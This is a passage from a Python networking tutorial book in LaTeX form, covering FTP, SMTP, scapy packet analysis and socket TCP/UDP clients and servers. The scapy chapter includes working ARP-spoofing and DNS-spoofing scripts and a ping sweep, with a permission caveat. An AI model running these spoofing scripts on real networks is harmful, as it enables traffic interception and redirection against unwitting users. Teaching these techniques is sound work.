\NormalTok{ftp }\OperatorTok{=}\NormalTok{ FTP(}\StringTok{\textquotesingle{}ftp.dlptest.com\textquotesingle{}}\NormalTok{)}
\NormalTok{ftp.login()}

\NormalTok{ftp.retrlines(}\StringTok{\textquotesingle{}LIST\textquotesingle{}}\NormalTok{)}

\NormalTok{ftp.quit()}
\end{Highlighting}
\end{Shaded}

\subsubsection{SMTP (Simple Mail Transfer
Protocol)}\label{smtp-simple-mail-transfer-protocol}

SMTP is used for sending emails.

\paragraph{\texorpdfstring{Example: Sending Email using
\texttt{smtplib}}{Example: Sending Email using smtplib}}\label{example-sending-email-using-smtplib}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ smtplib}
\ImportTok{from}\NormalTok{ email.mime.text }\ImportTok{import}\NormalTok{ MIMEText}

\NormalTok{msg }\OperatorTok{=}\NormalTok{ MIMEText(}\StringTok{"This is the body of the email."}\NormalTok{)}
\NormalTok{msg[}\StringTok{\textquotesingle{}Subject\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{"Test Email"}
\NormalTok{msg[}\StringTok{\textquotesingle{}From\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{"your\_email@example.com"}
\NormalTok{msg[}\StringTok{\textquotesingle{}To\textquotesingle{}}\NormalTok{] }\OperatorTok{=} \StringTok{"recipient\_email@example.com"}

\ControlFlowTok{with}\NormalTok{ smtplib.SMTP(}\StringTok{\textquotesingle{}smtp.example.com\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ server:}
\NormalTok{    server.login(}\StringTok{"your\_email@example.com"}\NormalTok{, }\StringTok{"your\_password"}\NormalTok{)}
\NormalTok{    server.sendmail(msg[}\StringTok{\textquotesingle{}From\textquotesingle{}}\NormalTok{], [msg[}\StringTok{\textquotesingle{}To\textquotesingle{}}\NormalTok{]], msg.as\_string())}
\end{Highlighting}
\end{Shaded}

\subsection{\texorpdfstring{Network Packet Analysis with
\texttt{scapy}}{Network Packet Analysis with scapy}}\label{network-packet-analysis-with-scapy}

\texttt{scapy} is a powerful Python library for network packet
manipulation and analysis.

\subsubsection{\texorpdfstring{Installing
\texttt{scapy}}{Installing scapy}}\label{installing-scapy}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install scapy}
\end{Highlighting}
\end{Shaded}

\subsubsection{Example: Capturing and Analyzing
Packets}\label{example-capturing-and-analyzing-packets}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ scapy.}\BuiltInTok{all} \ImportTok{import}\NormalTok{ sniff}

\KeywordTok{def}\NormalTok{ packet\_callback(packet):}
    \BuiltInTok{print}\NormalTok{(packet.show())}

\CommentTok{\# Capture 10 packets}
\NormalTok{sniff(prn}\OperatorTok{=}\NormalTok{packet\_callback, count}\OperatorTok{=}\DecValTok{10}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-43}

Understanding network architecture and protocols is essential for
designing and managing efficient networks. Python provides powerful
libraries like \texttt{scapy} and \texttt{socket} to interact with and
analyze network traffic. By mastering these tools and concepts, you can
develop robust networked applications and effectively troubleshoot
network issues.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{scapy} Python Module
for Network Packet
Analysis}{Deep Dive into the scapy Python Module for Network Packet Analysis}}\label{deep-dive-into-the-scapy-python-module-for-network-packet-analysis}

\texttt{scapy} is a powerful Python module used for network packet
manipulation, analysis, and crafting. It is widely used in network
security and research to create, manipulate, send, and capture network
packets. This tutorial provides a comprehensive guide to using
\texttt{scapy} for network packet analysis.

\section{Table of Contents}\label{table-of-contents-17}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-scapy]{Introduction to \texttt{scapy}}
\item
  \hyperref[installing-scapy]{Installing \texttt{scapy}}
\item
  \hyperref[basic-concepts]{Basic Concepts}
\item
  \hyperref[creating-and-sending-packets]{Creating and Sending Packets}
\item
  \hyperref[capturing-packets]{Capturing Packets}
\item
  \hyperref[analyzing-packets]{Analyzing Packets}
\item
  \hyperref[advanced-usage]{Advanced Usage}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to
\texttt{scapy}}{Introduction to scapy}}\label{introduction-to-scapy}

\texttt{scapy} is a Python-based interactive network packet manipulation
tool. It allows you to create, send, receive, and manipulate network
packets. It supports many network protocols and can be used for tasks
such as network discovery, scanning, tracerouting, probing, and
penetration testing.

\section{\texorpdfstring{Installing
\texttt{scapy}}{Installing scapy}}\label{installing-scapy-1}

To install \texttt{scapy}, you can use pip:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install scapy}
\end{Highlighting}
\end{Shaded}

You may also need to install additional system dependencies, such as
\texttt{libpcap} and \texttt{tcpdump}, depending on your operating
system.

\section{Basic Concepts}\label{basic-concepts-1}

\subsection{\texorpdfstring{Importing
\texttt{scapy}}{Importing scapy}}\label{importing-scapy}

To use \texttt{scapy}, you need to import it:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ scapy.}\BuiltInTok{all} \ImportTok{import} \OperatorTok{*}
\end{Highlighting}
\end{Shaded}

\subsection{Layers and Packets}\label{layers-and-packets}

\texttt{scapy} uses a layered approach to construct and dissect packets.
Each layer represents a network protocol (e.g., Ethernet, IP, TCP).
Packets are created by stacking these layers.

\subsection{Example}\label{example-59}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{ether }\OperatorTok{=}\NormalTok{ Ether()}
\NormalTok{ip }\OperatorTok{=}\NormalTok{ IP()}
\NormalTok{tcp }\OperatorTok{=}\NormalTok{ TCP()}
\NormalTok{packet }\OperatorTok{=}\NormalTok{ ether }\OperatorTok{/}\NormalTok{ ip }\OperatorTok{/}\NormalTok{ tcp}
\end{Highlighting}
\end{Shaded}

\section{Creating and Sending
Packets}\label{creating-and-sending-packets}

\subsection{Creating Packets}\label{creating-packets}

Packets can be created by instantiating layer objects and stacking them
together.

\subsection{Example}\label{example-60}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ Ether() }\OperatorTok{/}\NormalTok{ IP(dst}\OperatorTok{=}\StringTok{"192.168.1.1"}\NormalTok{) }\OperatorTok{/}\NormalTok{ TCP(dport}\OperatorTok{=}\DecValTok{80}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Sending Packets}\label{sending-packets}

To send packets, use the \texttt{send()} function for layer 3 packets
(IP) and \texttt{sendp()} for layer 2 packets (Ethernet).

\subsection{Example}\label{example-61}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{send(packet)}
\end{Highlighting}
\end{Shaded}

\subsection{Sending Multiple Packets}\label{sending-multiple-packets}

You can send multiple packets in a loop or use the \texttt{sendp()}
function with a list of packets.

\subsection{Example}\label{example-62}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packets }\OperatorTok{=}\NormalTok{ [Ether() }\OperatorTok{/}\NormalTok{ IP(dst}\OperatorTok{=}\StringTok{"192.168.1.1"}\NormalTok{) }\OperatorTok{/}\NormalTok{ TCP(dport}\OperatorTok{=}\DecValTok{80}\NormalTok{) }\ControlFlowTok{for}\NormalTok{ \_ }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{10}\NormalTok{)]}
\NormalTok{sendp(packets)}
\end{Highlighting}
\end{Shaded}

\section{Capturing Packets}\label{capturing-packets}

\subsection{Sniffing Packets}\label{sniffing-packets}

\texttt{scapy} provides the \texttt{sniff()} function to capture packets
from the network.

\subsection{Example}\label{example-63}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ packet\_callback(packet):}
    \BuiltInTok{print}\NormalTok{(packet.summary())}

\NormalTok{sniff(prn}\OperatorTok{=}\NormalTok{packet\_callback, count}\OperatorTok{=}\DecValTok{10}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Filtering Packets}\label{filtering-packets}

You can filter packets using BPF (Berkeley Packet Filter) syntax.

\subsection{Example}\label{example-64}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{sniff(}\BuiltInTok{filter}\OperatorTok{=}\StringTok{"tcp and port 80"}\NormalTok{, prn}\OperatorTok{=}\NormalTok{packet\_callback, count}\OperatorTok{=}\DecValTok{10}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Analyzing Packets}\label{analyzing-packets}

\subsection{Dissecting Packets}\label{dissecting-packets}

Once you have captured packets, you can dissect and analyze them using
various \texttt{scapy} functions.

\subsection{Example}\label{example-65}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ sniff(count}\OperatorTok{=}\DecValTok{1}\NormalTok{)[}\DecValTok{0}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(packet.show())}
\end{Highlighting}
\end{Shaded}

\subsection{Accessing Packet Fields}\label{accessing-packet-fields}

You can access specific fields within a packet by treating it like a
dictionary.

\subsection{Example}\label{example-66}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ sniff(count}\OperatorTok{=}\DecValTok{1}\NormalTok{)[}\DecValTok{0}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(packet[IP].src)}
\BuiltInTok{print}\NormalTok{(packet[IP].dst)}
\end{Highlighting}
\end{Shaded}

\subsection{Working with Layers}\label{working-with-layers}

You can access different layers of a packet using indexing.

\subsection{Example}\label{example-67}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ sniff(count}\OperatorTok{=}\DecValTok{1}\NormalTok{)[}\DecValTok{0}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(packet[Ether].src)}
\BuiltInTok{print}\NormalTok{(packet[IP].src)}
\BuiltInTok{print}\NormalTok{(packet[TCP].dport)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Usage}\label{advanced-usage-2}

\subsection{Custom Packet Crafting}\label{custom-packet-crafting}

You can create custom packets by defining your own layers.

\subsection{Example}\label{example-68}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{class}\NormalTok{ Custom(Packet):}
\NormalTok{    name }\OperatorTok{=} \StringTok{"Custom"}
\NormalTok{    fields\_desc }\OperatorTok{=}\NormalTok{ [ShortField(}\StringTok{"field1"}\NormalTok{, }\DecValTok{1}\NormalTok{), IntField(}\StringTok{"field2"}\NormalTok{, }\DecValTok{2}\NormalTok{)]}

\NormalTok{custom\_packet }\OperatorTok{=}\NormalTok{ Custom(field1}\OperatorTok{=}\DecValTok{10}\NormalTok{, field2}\OperatorTok{=}\DecValTok{20}\NormalTok{)}
\NormalTok{send(custom\_packet)}
\end{Highlighting}
\end{Shaded}

\subsection{Packet Manipulation}\label{packet-manipulation}

You can manipulate packets by modifying their fields.

\subsection{Example}\label{example-69}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ IP(dst}\OperatorTok{=}\StringTok{"192.168.1.1"}\NormalTok{) }\OperatorTok{/}\NormalTok{ TCP(dport}\OperatorTok{=}\DecValTok{80}\NormalTok{)}
\NormalTok{packet[IP].dst }\OperatorTok{=} \StringTok{"192.168.1.2"}
\NormalTok{send(packet)}
\end{Highlighting}
\end{Shaded}

\subsection{Protocol Dissection}\label{protocol-dissection}

\texttt{scapy} can dissect various protocols, making it useful for
analyzing network traffic.

\subsection{Example}\label{example-70}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{packet }\OperatorTok{=}\NormalTok{ sniff(count}\OperatorTok{=}\DecValTok{1}\NormalTok{)[}\DecValTok{0}\NormalTok{]}
\ControlFlowTok{if}\NormalTok{ packet.haslayer(DNS):}
    \BuiltInTok{print}\NormalTok{(packet[DNS].summary())}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-10}

\subsection{Example 1: Ping Sweep}\label{example-1-ping-sweep}

This example demonstrates how to perform a ping sweep to discover live
hosts on a network.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ ping\_sweep(network):}
\NormalTok{    ans, unans }\OperatorTok{=}\NormalTok{ sr(IP(dst}\OperatorTok{=}\NormalTok{network)}\OperatorTok{/}\NormalTok{ICMP(), timeout}\OperatorTok{=}\DecValTok{2}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ snd, rcv }\KeywordTok{in}\NormalTok{ ans:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"}\SpecialCharTok{\{}\NormalTok{rcv}\SpecialCharTok{.}\NormalTok{src}\SpecialCharTok{\}}\SpecialStringTok{ is alive"}\NormalTok{)}

\NormalTok{ping\_sweep(}\StringTok{"192.168.1.0/24"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: ARP Spoofing}\label{example-2-arp-spoofing}

This example demonstrates how to perform ARP spoofing to intercept
network traffic.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ arp\_spoof(target\_ip, spoof\_ip):}
\NormalTok{    packet }\OperatorTok{=}\NormalTok{ ARP(op}\OperatorTok{=}\DecValTok{2}\NormalTok{, pdst}\OperatorTok{=}\NormalTok{target\_ip, hwdst}\OperatorTok{=}\StringTok{"ff:ff:ff:ff:ff:ff"}\NormalTok{, psrc}\OperatorTok{=}\NormalTok{spoof\_ip)}
\NormalTok{    send(packet, verbose}\OperatorTok{=}\VariableTok{False}\NormalTok{)}

\NormalTok{arp\_spoof(}\StringTok{"192.168.1.100"}\NormalTok{, }\StringTok{"192.168.1.1"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 3: DNS Spoofing}\label{example-3-dns-spoofing}

This example demonstrates how to perform DNS spoofing to redirect DNS
requests.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ dns\_spoof(pkt):}
    \ControlFlowTok{if}\NormalTok{ pkt.haslayer(DNS) }\KeywordTok{and}\NormalTok{ pkt.getlayer(DNS).qr }\OperatorTok{==} \DecValTok{0}\NormalTok{:}
\NormalTok{        spoofed\_pkt }\OperatorTok{=}\NormalTok{ IP(dst}\OperatorTok{=}\NormalTok{pkt[IP].src, src}\OperatorTok{=}\NormalTok{pkt[IP].dst) }\OperatorTok{/} \OperatorTok{\textbackslash{}}
\NormalTok{                      UDP(dport}\OperatorTok{=}\NormalTok{pkt[UDP].sport, sport}\OperatorTok{=}\DecValTok{53}\NormalTok{) }\OperatorTok{/} \OperatorTok{\textbackslash{}}
\NormalTok{                      DNS(}\BuiltInTok{id}\OperatorTok{=}\NormalTok{pkt[DNS].}\BuiltInTok{id}\NormalTok{, qr}\OperatorTok{=}\DecValTok{1}\NormalTok{, aa}\OperatorTok{=}\DecValTok{1}\NormalTok{, qd}\OperatorTok{=}\NormalTok{pkt[DNS].qd, an}\OperatorTok{=}\NormalTok{DNSRR(rrname}\OperatorTok{=}\NormalTok{pkt[DNS].qd.qname, ttl}\OperatorTok{=}\DecValTok{10}\NormalTok{, rdata}\OperatorTok{=}\StringTok{"192.168.1.2"}\NormalTok{))}
\NormalTok{        send(spoofed\_pkt, verbose}\OperatorTok{=}\VariableTok{False}\NormalTok{)}

\NormalTok{sniff(}\BuiltInTok{filter}\OperatorTok{=}\StringTok{"udp port 53"}\NormalTok{, prn}\OperatorTok{=}\NormalTok{dns\_spoof)}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-9}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Error Handling}: Always include error handling to manage
  unexpected conditions gracefully.
\item
  \textbf{Resource Management}: Ensure resources, such as sockets and
  files, are properly managed and closed.
\item
  \textbf{Security}: Be mindful of security implications, such as
  running sniffing or spoofing scripts, and only use them on networks
  you own or have permission to test.
\item
  \textbf{Documentation}: Document your code to make it easier to
  understand and maintain.
\item
  \textbf{Performance}: Optimize your code for performance, especially
  when dealing with high volumes of network traffic.
\end{enumerate}

\section{Conclusion}\label{conclusion-44}

The \texttt{scapy} module is a powerful tool for network packet
analysis, manipulation, and crafting. By understanding its basic and
advanced features, you can implement robust network analysis and
security solutions. Whether you are building a simple network scanner or
a complex packet manipulation tool, \texttt{scapy} provides the
necessary functionality to handle network communication effectively.

This tutorial has covered the fundamentals of \texttt{scapy}, from
creating and sending packets to capturing and analyzing them. With
practice and further exploration, you can leverage the full potential of
\texttt{scapy} in your network-related projects.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive Tutorial on Python's \texttt{socket}
Module for Implementing TCP and UDP Clients and
Servers}{Deep Dive Tutorial on Python's socket Module for Implementing TCP and UDP Clients and Servers}}\label{deep-dive-tutorial-on-pythons-socket-module-for-implementing-tcp-and-udp-clients-and-servers}

The \texttt{socket} module in Python provides a powerful low-level
interface for network communication. It supports the creation of both
TCP and UDP clients and servers, allowing for robust network
programming. This tutorial will guide you through the process of
implementing TCP and UDP clients and servers using Python's
\texttt{socket} module.

\section{Table of Contents}\label{table-of-contents-18}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-the-socket-module]{Introduction to the
  \texttt{socket} Module}
\item
  \hyperref[socket-basics]{Socket Basics}
\item
  \hyperref[implementing-a-tcp-server]{Implementing a TCP Server}
\item
  \hyperref[implementing-a-tcp-client]{Implementing a TCP Client}
\item
  \hyperref[implementing-a-udp-server]{Implementing a UDP Server}
\item
  \hyperref[implementing-a-udp-client]{Implementing a UDP Client}
\item
  \hyperref[error-handling-and-best-practices]{Error Handling and Best
  Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{\texorpdfstring{Introduction to the \texttt{socket}
Module}{Introduction to the socket Module}}\label{introduction-to-the-socket-module}

The \texttt{socket} module provides access to the BSD socket interface.
It supports various communication protocols, with TCP (Transmission
Control Protocol) and UDP (User Datagram Protocol) being the most
commonly used.

\subsection{Importing the Module}\label{importing-the-module}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}
\end{Highlighting}
\end{Shaded}

\section{Socket Basics}\label{socket-basics}

\subsection{Creating a Socket}\label{creating-a-socket-1}

A socket can be created using the \texttt{socket.socket()} function,
which takes two parameters: - \texttt{socket.AF\_INET}: Address family
for IPv4. - \texttt{socket.SOCK\_STREAM}: For TCP sockets (use
\texttt{socket.SOCK\_DGRAM} for UDP).

\subsection{Example}\label{example-71}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\end{Highlighting}
\end{Shaded}

\subsection{Binding a Socket}\label{binding-a-socket}

To bind a socket to an IP address and port, use the \texttt{bind()}
method.

\subsection{Example}\label{example-72}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\subsection{Listening for Connections
(TCP)}\label{listening-for-connections-tcp}

To listen for incoming connections on a TCP server, use the
\texttt{listen()} method.

\subsection{Example}\label{example-73}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{s.listen(}\DecValTok{5}\NormalTok{)  }\CommentTok{\# 5 is the maximum number of queued connections}
\end{Highlighting}
\end{Shaded}

\subsection{Accepting Connections
(TCP)}\label{accepting-connections-tcp}

To accept an incoming connection, use the \texttt{accept()} method,
which returns a new socket object and the address of the client.

\subsection{Example}\label{example-74}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{client\_socket, client\_address }\OperatorTok{=}\NormalTok{ s.accept()}
\end{Highlighting}
\end{Shaded}

\subsection{Sending and Receiving
Data}\label{sending-and-receiving-data-1}

\begin{itemize}
\tightlist
\item
  \textbf{TCP}: Use \texttt{send()} and \texttt{recv()}.
\item
  \textbf{UDP}: Use \texttt{sendto()} and \texttt{recvfrom()}.
\end{itemize}

\section{Implementing a TCP Server}\label{implementing-a-tcp-server}

\subsection{Steps to Implement a TCP
Server}\label{steps-to-implement-a-tcp-server}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Create a socket.
\item
  Bind the socket to an address and port.
\item
  Listen for incoming connections.
\item
  Accept connections and handle communication.
\item
  Close the connection.
\end{enumerate}

\subsection{Example TCP Server}\label{example-tcp-server-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ tcp\_server():}
\NormalTok{    server\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    server\_socket.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}
\NormalTok{    server\_socket.listen(}\DecValTok{5}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"TCP server listening on port 8080"}\NormalTok{)}

    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        client\_socket, client\_address }\OperatorTok{=}\NormalTok{ server\_socket.accept()}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connection from }\SpecialCharTok{\{}\NormalTok{client\_address}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

        \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{            data }\OperatorTok{=}\NormalTok{ client\_socket.recv(}\DecValTok{1024}\NormalTok{)}
            \ControlFlowTok{if} \KeywordTok{not}\NormalTok{ data:}
                \ControlFlowTok{break}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received data: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{            client\_socket.sendall(data)}

\NormalTok{        client\_socket.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    tcp\_server()}
\end{Highlighting}
\end{Shaded}

\section{Implementing a TCP Client}\label{implementing-a-tcp-client}

\subsection{Steps to Implement a TCP
Client}\label{steps-to-implement-a-tcp-client}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Create a socket.
\item
  Connect to the server.
\item
  Send and receive data.
\item
  Close the connection.
\end{enumerate}

\subsection{Example TCP Client}\label{example-tcp-client-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ tcp\_client():}
\NormalTok{    client\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    client\_socket.}\ExtensionTok{connect}\NormalTok{((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}

\NormalTok{    message }\OperatorTok{=} \StringTok{"Hello, Server!"}
\NormalTok{    client\_socket.sendall(message.encode())}

\NormalTok{    data }\OperatorTok{=}\NormalTok{ client\_socket.recv(}\DecValTok{1024}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received from server: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{    client\_socket.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    tcp\_client()}
\end{Highlighting}
\end{Shaded}

\section{Implementing a UDP Server}\label{implementing-a-udp-server}

\subsection{Steps to Implement a UDP
Server}\label{steps-to-implement-a-udp-server}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Create a socket.
\item
  Bind the socket to an address and port.
\item
  Receive data and respond.
\item
  Close the socket.
\end{enumerate}

\subsection{Example UDP Server}\label{example-udp-server-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ udp\_server():}
\NormalTok{    server\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)}
\NormalTok{    server\_socket.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"UDP server listening on port 8080"}\NormalTok{)}

    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        data, client\_address }\OperatorTok{=}\NormalTok{ server\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received data from }\SpecialCharTok{\{}\NormalTok{client\_address}\SpecialCharTok{\}}\SpecialStringTok{: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        server\_socket.sendto(data, client\_address)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    udp\_server()}
\end{Highlighting}
\end{Shaded}

\section{Implementing a UDP Client}\label{implementing-a-udp-client}

\subsection{Steps to Implement a UDP
Client}\label{steps-to-implement-a-udp-client}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Create a socket.
\item
  Send data to the server.
\item
  Receive response from the server.
\item
  Close the socket.
\end{enumerate}

\subsection{Example UDP Client}\label{example-udp-client-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\KeywordTok{def}\NormalTok{ udp\_client():}
\NormalTok{    client\_socket }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM)}

\NormalTok{    message }\OperatorTok{=} \StringTok{"Hello, Server!"}
\NormalTok{    client\_socket.sendto(message.encode(), (}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}

\NormalTok{    data, server\_address }\OperatorTok{=}\NormalTok{ client\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received from server: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

\NormalTok{    client\_socket.close()}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    udp\_client()}
\end{Highlighting}
\end{Shaded}

\section{Error Handling and Best
Practices}\label{error-handling-and-best-practices}

\subsection{Error Handling}\label{error-handling-3}

Proper error handling is crucial for robust network applications. Use
try-except blocks to handle exceptions.

\subsection{Example}\label{example-75}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{try}\NormalTok{:}
\NormalTok{    s }\OperatorTok{=}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)}
\NormalTok{    s.bind((}\StringTok{\textquotesingle{}localhost\textquotesingle{}}\NormalTok{, }\DecValTok{8080}\NormalTok{))}
\NormalTok{    s.listen(}\DecValTok{5}\NormalTok{)}
\ControlFlowTok{except}\NormalTok{ socket.error }\ImportTok{as}\NormalTok{ e:}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Socket error: }\SpecialCharTok{\{}\NormalTok{e}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\ControlFlowTok{finally}\NormalTok{:}
\NormalTok{    s.close()}
\end{Highlighting}
\end{Shaded}

\subsection{Best Practices}\label{best-practices-10}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Resource Management}: Ensure sockets are properly closed after
  use.
\item
  \textbf{Security}: Validate and sanitize data to prevent security
  vulnerabilities.
\item
  \textbf{Concurrency}: Use threading or asynchronous programming for
  handling multiple connections.
\item
  \textbf{Timeouts}: Set socket timeouts to avoid blocking indefinitely.
\end{enumerate}

\section{Conclusion}\label{conclusion-45}

This tutorial has covered the basics of using Python's \texttt{socket}
module to create TCP and UDP clients and servers. With this knowledge,
you can implement various network communication tasks, from simple
client-server applications to complex network protocols.

By understanding and leveraging the \texttt{socket} module, you can
build robust and efficient networked applications in Python. Explore
further into advanced topics like asynchronous sockets, SSL/TLS, and
more to enhance your network programming skills.

\bookmarksetup{startatroot}

\chapter{Network Services and Management with
Python}\label{network-services-and-management-with-python}

Network services like DNS and DHCP, along with routing protocols such as
RIP, OSPF, and BGP, are critical components of network management.
Understanding IPv4 and IPv6 subnetting is also essential for efficient
network design. This tutorial will cover these topics and show how to
use Python libraries like \texttt{dnspython} for implementing DNS query
scripts.

\subsection{DNS (Domain Name System)}\label{dns-domain-name-system}

DNS is a service that translates domain names into IP addresses, making
it easier for users to access websites without remembering numeric IP
addresses.

\subsubsection{\texorpdfstring{Installing
\texttt{dnspython}}{Installing dnspython}}\label{installing-dnspython}

First, install the \texttt{dnspython} library:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install dnspython}
\end{Highlighting}
\end{Shaded}

\subsubsection{Performing DNS Queries}\label{performing-dns-queries}

